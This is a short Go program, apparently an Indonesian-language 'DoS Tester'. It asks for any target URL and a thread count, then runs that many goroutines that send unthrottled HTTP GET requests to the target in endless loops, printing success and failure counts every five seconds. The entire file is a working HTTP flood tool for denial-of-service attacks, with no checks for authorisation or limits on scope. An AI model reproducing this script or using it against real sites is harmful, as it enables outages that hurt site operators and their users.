package main

import (
	"fmt"
	"net/http"
	"sync/atomic"
	"time"
)

var success uint64 = 0
var failed uint64 = 0

func attack(target string) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for {
		resp, err := client.Get(target)
		if err != nil {
			atomic.AddUint64(&failed, 1)
			continue
		}

		if resp.StatusCode == 200 {
			atomic.AddUint64(&success, 1)
		} else {
			atomic.AddUint64(&failed, 1)
		}
		resp.Body.Close()
	}
}

func monitor() {
	for {
		time.Sleep(5 * time.Second)
		fmt.Printf("[Monitor] Sukses: %d | Gagal: %d\n", atomic.LoadUint64(&success), atomic.LoadUint64(&failed))
	}
}

func main() {
	var target string
	var threads int

	fmt.Print("Target URL: ")
	fmt.Scan(&target)

	fmt.Print("Jumlah Threads: ")
	fmt.Scan(&threads)

	fmt.Printf("Memulai DoS Tester ke %s dengan %d threads\n", target, threads)

	for i := 0; i < threads; i++ {
		go attack(target)
	}

	monitor()
}
